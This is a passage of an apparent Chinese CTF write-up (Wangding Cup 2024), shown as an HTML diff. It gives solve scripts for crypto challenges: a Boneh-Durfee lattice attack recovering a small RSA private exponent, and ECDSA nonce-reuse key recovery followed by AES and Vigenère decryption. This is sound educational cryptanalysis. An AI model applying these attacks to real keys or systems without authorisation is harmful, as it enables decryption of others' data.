jj] / monomials[jj](UU,XX,YY)<br> <br>            <span class="hljs-comment"># 结果</span><br>            PR.&lt;q&gt; = PolynomialRing(ZZ)<br>            rr = pol1.resultant(pol2)<br> <br> <br>            <span class="hljs-keyword">if</span> rr.is_zero() <span class="hljs-keyword">or</span> rr.monomials() == [<span class="hljs-number">1</span>]:<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span> (<span class="hljs-string">"found them, using vectors"</span>, pol1_idx, <span class="hljs-string">"and"</span>, pol2_idx)<br>                found_polynomials = <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> found_polynomials:<br>            <span class="hljs-keyword">break</span><br> <br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> found_polynomials:<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">"no independant vectors could be found. This should very rarely happen..."</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br> <br>    rr = rr(q, q)<br> <br>    <span class="hljs-comment"># solutions</span><br>    soly = rr.roots()<br> <br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(soly) == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">"Your prediction (delta) is too small"</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br> <br>    soly = soly[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]<br>    ss = pol1(q, soly)<br>    solx = ss.roots()[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">return</span> solx, soly<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">example</span>():<br>    <span class="hljs-comment">############################################</span><br>    <span class="hljs-comment"># 随机生成数据</span><br>    <span class="hljs-comment">##########################################</span><br>    <span class="hljs-comment">#start_time =time.perf_counter</span><br>    start =time.clock()<br>    size=<span class="hljs-number">512</span><br>    length_N = <span class="hljs-number">2</span>*size;<br>    ss=<span class="hljs-number">0</span><br>    s=<span class="hljs-number">70</span>;<br>    M=<span class="hljs-number">1</span>   <span class="hljs-comment"># the number of experiments</span><br>    delta = <span class="hljs-number">299</span>/<span class="hljs-number">1024</span><br>    <span class="hljs-comment"># p =  random_prime(2^512,2^511)</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(M):<br><span class="hljs-comment">#         p =  random_prime(2^size,None,2^(size-1))</span><br><span class="hljs-comment">#         q =  random_prime(2^size,None,2^(size-1))</span><br><span class="hljs-comment">#         if(p&lt;q):</span><br><span class="hljs-comment">#             temp=p</span><br><span class="hljs-comment">#             p=q</span><br><span class="hljs-comment">#             q=temp</span><br>        N = <br>        e = <br>        c = <br>        hint1 =   <span class="hljs-comment"># p高位</span><br>        hint2 =   <span class="hljs-comment"># q高位</span><br><span class="hljs-comment">#         print ("p真实高",s,"比特：", int(p/2^(512-s)))</span><br><span class="hljs-comment">#         print ("q真实高",s,"比特：", int(q/2^(512-s)))</span><br> <br><span class="hljs-comment">#         N = p*q;</span><br> <br> <br>    <span class="hljs-comment"># 解密指数d的指数( 最大0.292)</span><br> <br> <br> <br>        m = <span class="hljs-number">7</span>   <span class="hljs-comment"># 格大小（越大越好/越慢）</span><br>        t = <span class="hljs-built_in">round</span>(((<span class="hljs-number">1</span>-<span class="hljs-number">2</span>*delta) * m))  <span class="hljs-comment"># 来自 Herrmann 和 May 的优化</span><br>        X = floor(N^delta)  <span class="hljs-comment"># </span><br>        Y = floor(N^(<span class="hljs-number">1</span>/<span class="hljs-number">2</span>)/<span class="hljs-number">2</span>^s)    <span class="hljs-comment"># 如果 p、 q 大小相同，则正确</span><br>        <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">int</span>(hint1),<span class="hljs-built_in">int</span>(hint1)+<span class="hljs-number">1</span>):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">'\n\n\n l='</span>,l)<br>            pM=l;<br>            p0=pM*<span class="hljs-number">2</span>^(size-s)+<span class="hljs-number">2</span>^(size-s)-<span class="hljs-number">1</span>;<br>            q0=N/p0;<br>            qM=<span class="hljs-built_in">int</span>(q0/<span class="hljs-number">2</span>^(size-s))<br>            A = N + <span class="hljs-number">1</span>-pM*<span class="hljs-number">2</span>^(size-s)-qM*<span class="hljs-number">2</span>^(size-s);<br>        <span class="hljs-comment">#A = N+1</span><br>            P.&lt;x,y&gt; = PolynomialRing(ZZ)<br>            pol = <span class="hljs-number">1</span> + x * (A + y)  <span class="hljs-comment">#构建的方程</span><br> <br>            <span class="hljs-comment"># Checking bounds</span><br>            <span class="hljs-comment">#if debug:</span><br>                <span class="hljs-comment">#print ("=== 核对数据 ===")</span><br>                <span class="hljs-comment">#print ("* delta:", delta)</span><br>                <span class="hljs-comment">#print ("* delta &lt; 0.292", delta &lt; 0.292)</span><br>                <span class="hljs-comment">#print ("* size of e:", ceil(log(e)/log(2)))  # e的bit数</span><br>                <span class="hljs-comment"># print ("* size of N:", len(bin(N)))          # N的bit数</span><br>                <span class="hljs-comment">#print ("* size of N:", ceil(log(N)/log(2)))  # N的bit数</span><br>                <span class="hljs-comment">#print ("* m:", m, ", t:", t)</span><br> <br>            <span class="hljs-comment"># boneh_durfee</span><br>            <span class="hljs-keyword">if</span> debug:<br>                <span class="hljs-comment">##print ("=== running algorithm ===")</span><br>                start_time = time.time()<br> <br> <br>            solx, soly = boneh_durfee(pol, e, m, t, X, Y)<br> <br> <br>            <span class="hljs-keyword">if</span> solx &gt; <span class="hljs-number">0</span>:<br>                <span class="hljs-comment">#print ("=== solution found ===")</span><br>                <span class="hljs-keyword">if</span> <span class="hljs-literal">False</span>:<br>                    <span class="hljs-built_in">print</span> (<span class="hljs-string">"x:"</span>, solx)<br>                    <span class="hljs-built_in">print</span> (<span class="hljs-string">"y:"</span>, soly)<br> <br>                d_sol = <span class="hljs-built_in">int</span>(pol(solx, soly) / e)<br>                ss=ss+<span class="hljs-number">1</span><br><br>                <span class="hljs-built_in">print</span> (<span class="hljs-string">"=== solution found ==="</span>)<br>                <span class="hljs-built_in">print</span> (<span class="hljs-string">"p的高比特为："</span>,l)<br>                <span class="hljs-built_in">print</span> (<span class="hljs-string">"q的高比特为："</span>,qM)<br>                <span class="hljs-built_in">print</span> (<span class="hljs-string">"d="</span>,d_sol) <br> <br>            <span class="hljs-keyword">if</span> debug:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">"=== %s seconds ==="</span> % (time.time() - start_time))<br>            <span class="hljs-comment">#break</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">"ss="</span>,ss)<br>                            <span class="hljs-comment">#end=time.process_time</span><br>        end=time.clock()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">'Running time: %s Seconds'</span>%(end-start))<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:<br>    example()  <br></code></pre></td></tr></tbody></table></figure>
 <p>所以把数据填进去，经过四十秒的紧张计算就得到了<code>d</code></p>
 <p><img src="https://assets.bili33.top/img/CTF-Wangding2024-Qinglong-Preliminary-round-Writeup/vmware_pb8UKCMX6B.png" alt=""></p>
 <p>d=697791299328204454525050115930116025227680411125210507143694169686384063060766101784129969</p>
 <p>然后来个经典的RSA解密脚本</p>
-<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">114118679597315994458138232536029700477506764789782067073905766324635160145597602207164997807103187990046901850125798774503781767630201814025142189432534890147340404293319424524872695905368897290630698362559606549134377263394129199145835483978820237203114250882524438599220793209608842281879976692805855046971</span></span><br><span class="line">d = <span class="number">697791299328204454525050115930116025227680411125210507143694169686384063060766101784129969</span></span><br><span class="line">c = <span class="number">11058775585296329544235824126670578486484201903851563493984057289075513008773878014007377223222464555346135675900619903617528838701118612201290486747980233570288315027654510774940371032813981282018787668864123759554297515664915358447425647424759926416629451915378248520432568536260902676664298855076689608823</span></span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>n = <span class="hljs-number">114118679597315994458138232536029700477506764789782067073905766324635160145597602207164997807103187990046901850125798774503781767630201814025142189432534890147340404293319424524872695905368897290630698362559606549134377263394129199145835483978820237203114250882524438599220793209608842281879976692805855046971</span><br>d = <span class="hljs-number">697791299328204454525050115930116025227680411125210507143694169686384063060766101784129969</span><br>c = <span class="hljs-number">11058775585296329544235824126670578486484201903851563493984057289075513008773878014007377223222464555346135675900619903617528838701118612201290486747980233570288315027654510774940371032813981282018787668864123759554297515664915358447425647424759926416629451915378248520432568536260902676664298855076689608823</span><br><br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></tbody></table></figure>
 <p>解出flag为<code>wdflag{c5b3e498-0f4c-4f40-937f-e690d8062b89}</code></p>
 <p><img src="https://assets.bili33.top/img/CTF-Wangding2024-Qinglong-Preliminary-round-Writeup/WindowsTerminal_W202h53Dwq.png" alt=""></p>
 <h2 id="Crypto02（By-Luminoria）">Crypto02（By Luminoria）</h2>
@@ -457,9 +342,9 @@ from Crypto.Util.number impor">
 <p>运维人员在网络监控中发现了一段可疑的字符串，经过初步分析，他们怀疑这段数据可能是使用AES加密的。为了确定这段数据的内容，他们需要找到正确的密钥。</p>
 </blockquote>
 <p>题目源码如下</p>
-<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> FLAG <span class="keyword">import</span> flag</span><br><span class="line"><span class="comment">#flag = 'wdflag{123}'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">victory_encrypt</span>(<span class="params">plaintext, key</span>):</span><br><span class="line">    key = key.upper()</span><br><span class="line">    key_length = <span class="built_in">len</span>(key)</span><br><span class="line">    plaintext = plaintext.upper()</span><br><span class="line">    ciphertext = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(plaintext):</span><br><span class="line">        <span class="keyword">if</span> char.isalpha():</span><br><span class="line">            shift = <span class="built_in">ord</span>(key[i % key_length]) - <span class="built_in">ord</span>(<span class="string">'A'</span>)</span><br><span class="line">            encrypted_char = <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">'A'</span>) + shift) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">'A'</span>))</span><br><span class="line">            ciphertext += encrypted_char</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ciphertext += char</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line">victory_key = <span class="string">"WANGDINGCUP"</span></span><br><span class="line">victory_encrypted_flag = victory_encrypt(flag, victory_key)</span><br><span class="line"></span><br><span class="line">p = <span class="number">0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f</span></span><br><span class="line">a = <span class="number">0</span></span><br><span class="line">b = <span class="number">7</span></span><br><span class="line">xG = <span class="number">0x79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798</span></span><br><span class="line">yG = <span class="number">0x483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8</span></span><br><span class="line">G = (xG, yG)</span><br><span class="line">n = <span class="number">0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141</span></span><br><span class="line">h = <span class="number">1</span></span><br><span class="line">zero = (<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">dA = nextprime(random.randint(<span class="number">0</span>, n))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> dA &gt; n:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"warning!!"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addition</span>(<span class="params">t1, t2</span>):</span><br><span class="line">    <span class="keyword">if</span> t1 == zero:</span><br><span class="line">        <span class="keyword">return</span> t2</span><br><span class="line">    <span class="keyword">if</span> t2 == zero:</span><br><span class="line">        <span class="keyword">return</span> t2</span><br><span class="line">    (m1, n1) = t1</span><br><span class="line">    (m2, n2) = t2</span><br><span class="line">    <span class="keyword">if</span> m1 == m2:</span><br><span class="line">        <span class="keyword">if</span> n1 == <span class="number">0</span> <span class="keyword">or</span> n1 != n2:</span><br><span class="line">            <span class="keyword">return</span> zero</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            k = (<span class="number">3</span> * m1 * m1 + a) % p * gmpy2.invert(<span class="number">2</span> * n1 , p) % p</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        k = (n2 - n1 + p) % p * gmpy2.invert((m2 - m1 + p) % p, p) % p</span><br><span class="line">    m3 = (k * k % p - m1 - m2 + p * <span class="number">2</span>) % p</span><br><span class="line">    n3 = (k * (m1 - m3) % p - n1 + p) % p</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">int</span>(m3),<span class="built_in">int</span>(n3))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multiplication</span>(<span class="params">x, k</span>):</span><br><span class="line">    ans = zero</span><br><span class="line">    t = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(t &lt;= k):</span><br><span class="line">        <span class="keyword">if</span> (k &amp;t )&gt;<span class="number">0</span>:</span><br><span class="line">            ans = addition(ans, x)</span><br><span class="line">        x = addition(x, x)</span><br><span class="line">        t &lt;&lt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getrs</span>(<span class="params">z, k</span>):</span><br><span class="line">    (xp, yp) = P</span><br><span class="line">    r = xp</span><br><span class="line">    s = (z + r * dA % n) % n * gmpy2.invert(k, n) % n</span><br><span class="line">    <span class="keyword">return</span> r,s</span><br><span class="line"></span><br><span class="line">z1 = random.randint(<span class="number">0</span>, p)</span><br><span class="line">z2 = random.randint(<span class="number">0</span>, p)</span><br><span class="line">k = random.randint(<span class="number">0</span>, n)</span><br><span class="line">P = multiplication(G, k)</span><br><span class="line">hA = multiplication(G, dA)</span><br><span class="line">r1, s1 = getrs(z1, k)</span><br><span class="line">r2, s2 = getrs(z2, k)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"r1 = {}"</span>.<span class="built_in">format</span>(r1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"r2 = {}"</span>.<span class="built_in">format</span>(r2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"s1 = {}"</span>.<span class="built_in">format</span>(s1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"s2 = {}"</span>.<span class="built_in">format</span>(s2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"z1 = {}"</span>.<span class="built_in">format</span>(z1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"z2 = {}"</span>.<span class="built_in">format</span>(z2))</span><br><span class="line"></span><br><span class="line">key = sha256(long_to_bytes(dA)).digest()</span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC)</span><br><span class="line">iv = cipher.iv</span><br><span class="line">encrypted_flag = cipher.encrypt(pad(victory_encrypted_flag.encode(), AES.block_size))</span><br><span class="line">encrypted_flag_hex = binascii.hexlify(iv + encrypted_flag).decode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Encrypted flag (AES in CBC mode, hex):"</span>, encrypted_flag_hex)</span><br><span class="line"></span><br><span class="line"><span class="comment"># output</span></span><br><span class="line"><span class="comment"># r1 = 111817653331957669294460466848850458804857945556928458406600106150268654577388</span></span><br><span class="line"><span class="comment"># r2 = 111817653331957669294460466848850458804857945556928458406600106150268654577388</span></span><br><span class="line"><span class="comment"># s1 = 86614391420642776223990568523561232627667766343605236785504627521619587526774</span></span><br><span class="line"><span class="comment"># s2 = 99777373725561160499828739472284705447694429465579067222876023876942075279416</span></span><br><span class="line"><span class="comment"># z1 = 96525870193778873849147733081234547336150390817999790407096946391065286856874</span></span><br><span class="line"><span class="comment"># z2 = 80138688082399628724400273131729065525373481983222188646486307533062536927379</span></span><br><span class="line"><span class="comment"># ('Encrypted flag (AES in CBC mode, hex):', u'6c201c3c4e8b0a2cdd0eca11e7101d45d7b33147d27ad1b9d57e3d1e20c7b3c2e36b8da3142dfd5abe335a604ce7018878b9f157099211a7bbda56ef5285ec0b')</span></span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding: utf-8</span><br><span class="hljs-comment">#!/usr/bin/env python2</span><br><br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> nextprime<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">from</span> FLAG <span class="hljs-keyword">import</span> flag<br><span class="hljs-comment">#flag = 'wdflag{123}'</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">victory_encrypt</span>(<span class="hljs-params">plaintext, key</span>):<br>    key = key.upper()<br>    key_length = <span class="hljs-built_in">len</span>(key)<br>    plaintext = plaintext.upper()<br>    ciphertext = <span class="hljs-string">''</span><br><br>    <span class="hljs-keyword">for</span> i, char <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(plaintext):<br>        <span class="hljs-keyword">if</span> char.isalpha():<br>            shift = <span class="hljs-built_in">ord</span>(key[i % key_length]) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">'A'</span>)<br>            encrypted_char = <span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(char) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">'A'</span>) + shift) % <span class="hljs-number">26</span> + <span class="hljs-built_in">ord</span>(<span class="hljs-string">'A'</span>))<br>            ciphertext += encrypted_char<br>        <span class="hljs-keyword">else</span>:<br>            ciphertext += char<br><br>    <span class="hljs-keyword">return</span> ciphertext<br><br>victory_key = <span class="hljs-string">"WANGDINGCUP"</span><br>victory_encrypted_flag = victory_encrypt(flag, victory_key)<br><br>p = <span class="hljs-number">0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f</span><br>a = <span class="hljs-number">0</span><br>b = <span class="hljs-number">7</span><br>xG = <span class="hljs-number">0x79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798</span><br>yG = <span class="hljs-number">0x483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8</span><br>G = (xG, yG)<br>n = <span class="hljs-number">0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141</span><br>h = <span class="hljs-number">1</span><br>zero = (<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br><br>dA = nextprime(random.randint(<span class="hljs-number">0</span>, n))<br><br><span class="hljs-keyword">if</span> dA &gt; n:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">"warning!!"</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">addition</span>(<span class="hljs-params">t1, t2</span>):<br>    <span class="hljs-keyword">if</span> t1 == zero:<br>        <span class="hljs-keyword">return</span> t2<br>    <span class="hljs-keyword">if</span> t2 == zero:<br>        <span class="hljs-keyword">return</span> t2<br>    (m1, n1) = t1<br>    (m2, n2) = t2<br>    <span class="hljs-keyword">if</span> m1 == m2:<br>        <span class="hljs-keyword">if</span> n1 == <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> n1 != n2:<br>            <span class="hljs-keyword">return</span> zero<br>        <span class="hljs-keyword">else</span>:<br>            k = (<span class="hljs-number">3</span> * m1 * m1 + a) % p * gmpy2.invert(<span class="hljs-number">2</span> * n1 , p) % p<br>    <span class="hljs-keyword">else</span>:<br>        k = (n2 - n1 + p) % p * gmpy2.invert((m2 - m1 + p) % p, p) % p<br>    m3 = (k * k % p - m1 - m2 + p * <span class="hljs-number">2</span>) % p<br>    n3 = (k * (m1 - m3) % p - n1 + p) % p<br>    <span class="hljs-keyword">return</span> (<span class="hljs-built_in">int</span>(m3),<span class="hljs-built_in">int</span>(n3))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">multiplication</span>(<span class="hljs-params">x, k</span>):<br>    ans = zero<br>    t = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span>(t &lt;= k):<br>        <span class="hljs-keyword">if</span> (k &amp;t )&gt;<span class="hljs-number">0</span>:<br>            ans = addition(ans, x)<br>        x = addition(x, x)<br>        t &lt;&lt;= <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> ans<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getrs</span>(<span class="hljs-params">z, k</span>):<br>    (xp, yp) = P<br>    r = xp<br>    s = (z + r * dA % n) % n * gmpy2.invert(k, n) % n<br>    <span class="hljs-keyword">return</span> r,s<br><br>z1 = random.randint(<span class="hljs-number">0</span>, p)<br>z2 = random.randint(<span class="hljs-number">0</span>, p)<br>k = random.randint(<span class="hljs-number">0</span>, n)<br>P = multiplication(G, k)<br>hA = multiplication(G, dA)<br>r1, s1 = getrs(z1, k)<br>r2, s2 = getrs(z2, k)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">"r1 = {}"</span>.<span class="hljs-built_in">format</span>(r1))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">"r2 = {}"</span>.<span class="hljs-built_in">format</span>(r2))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">"s1 = {}"</span>.<span class="hljs-built_in">format</span>(s1))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">"s2 = {}"</span>.<span class="hljs-built_in">format</span>(s2))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">"z1 = {}"</span>.<span class="hljs-built_in">format</span>(z1))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">"z2 = {}"</span>.<span class="hljs-built_in">format</span>(z2))<br><br>key = sha256(long_to_bytes(dA)).digest()<br>cipher = AES.new(key, AES.MODE_CBC)<br>iv = cipher.iv<br>encrypted_flag = cipher.encrypt(pad(victory_encrypted_flag.encode(), AES.block_size))<br>encrypted_flag_hex = binascii.hexlify(iv + encrypted_flag).decode(<span class="hljs-string">'utf-8'</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">"Encrypted flag (AES in CBC mode, hex):"</span>, encrypted_flag_hex)<br><br><span class="hljs-comment"># output</span><br><span class="hljs-comment"># r1 = 111817653331957669294460466848850458804857945556928458406600106150268654577388</span><br><span class="hljs-comment"># r2 = 111817653331957669294460466848850458804857945556928458406600106150268654577388</span><br><span class="hljs-comment"># s1 = 86614391420642776223990568523561232627667766343605236785504627521619587526774</span><br><span class="hljs-comment"># s2 = 99777373725561160499828739472284705447694429465579067222876023876942075279416</span><br><span class="hljs-comment"># z1 = 96525870193778873849147733081234547336150390817999790407096946391065286856874</span><br><span class="hljs-comment"># z2 = 80138688082399628724400273131729065525373481983222188646486307533062536927379</span><br><span class="hljs-comment"># ('Encrypted flag (AES in CBC mode, hex):', u'6c201c3c4e8b0a2cdd0eca11e7101d45d7b33147d27ad1b9d57e3d1e20c7b3c2e36b8da3142dfd5abe335a604ce7018878b9f157099211a7bbda56ef5285ec0b')</span><br></code></pre></td></tr></tbody></table></figure>
 <p>题目说的是AES加密，而且可以看到这里面还融合了其他的加密，然后我们写出解密脚本</p>
-<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># Parameters from the original code</span></span><br><span class="line">p = <span class="number">0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F</span></span><br><span class="line">a = <span class="number">0</span></span><br><span class="line">b = <span class="number">7</span></span><br><span class="line">xG = <span class="number">0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798</span></span><br><span class="line">yG = <span class="number">0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8</span></span><br><span class="line">G = (xG, yG)</span><br><span class="line">n = <span class="number">0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141</span></span><br><span class="line">h = <span class="number">1</span></span><br><span class="line">zero = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># From the provided values</span></span><br><span class="line">r1 = <span class="number">111817653331957669294460466848850458804857945556928458406600106150268654577388</span></span><br><span class="line">r2 = <span class="number">111817653331957669294460466848850458804857945556928458406600106150268654577388</span></span><br><span class="line">s1 = <span class="number">86614391420642776223990568523561232627667766343605236785504627521619587526774</span></span><br><span class="line">s2 = <span class="number">99777373725561160499828739472284705447694429465579067222876023876942075279416</span></span><br><span class="line">z1 = <span class="number">96525870193778873849147733081234547336150390817999790407096946391065286856874</span></span><br><span class="line">z2 = <span class="number">80138688082399628724400273131729065525373481983222188646486307533062536927379</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Calculate k</span></span><br><span class="line">k = (z1 - z2) * gmpy2.invert(s1 - s2, n) % n</span><br><span class="line"></span><br><span class="line"><span class="comment"># Calculate dA</span></span><br><span class="line">dA = (s1 * k - z1) * gmpy2.invert(r1, n) % n</span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate AES key</span></span><br><span class="line">key = sha256(long_to_bytes(dA)).digest()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt the AES-CBC ciphertext</span></span><br><span class="line">encrypted_flag_hex = <span class="string">"6c201c3c4e8b0a2cdd0eca11e7101d45d7b33147d27ad1b9d57e3d1e20c7b3c2e36b8da3142dfd5abe335a604ce7018878b9f157099211a7bbda56ef5285ec0b"</span></span><br><span class="line">encrypted_flag_bytes = binascii.unhexlify(encrypted_flag_hex)</span><br><span class="line">iv = encrypted_flag_bytes[:<span class="number">16</span>]</span><br><span class="line">ciphertext = encrypted_flag_bytes[<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">decrypted_flag = unpad(cipher.decrypt(ciphertext), AES.block_size)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt the Caesar cipher</span></span><br><span class="line">victory_key = <span class="string">"WANGDINGCUP"</span></span><br><span class="line">decrypted_flag_text = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> decrypted_flag.decode():</span><br><span class="line">    <span class="keyword">if</span> char.isalpha():</span><br><span class="line">        shift = <span class="built_in">ord</span>(victory_key[<span class="built_in">len</span>(decrypted_flag_text) % <span class="built_in">len</span>(victory_key)]) - <span class="built_in">ord</span>(<span class="string">"A"</span>)</span><br><span class="line">        decrypted_char = <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">"A"</span>) - shift) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">"A"</span>))</span><br><span class="line">        decrypted_flag_text += decrypted_char</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        decrypted_flag_text += char</span><br><span class="line">lower_flag = decrypted_flag_text.lower()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Decrypted flag:"</span>, lower_flag)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
